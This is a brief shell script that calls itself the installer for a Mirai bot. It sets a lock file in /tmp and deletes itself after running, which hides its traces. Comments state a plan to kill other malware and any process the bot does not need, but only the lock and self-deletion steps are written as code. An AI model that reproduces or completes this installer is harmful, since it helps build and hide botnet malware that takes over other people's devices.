#!/bin/sh

if [ -f /tmp/mirai.lock ]; then
	echo "Mirai bot already running"
	rm -- "$0"
	exit 0
fi

echo "Bot installed. Starting the bot..."

touch /tmp/mirai.lock

# kill any other malware in the device
# kill any process that is not useful to the bot

rm -- "$0"
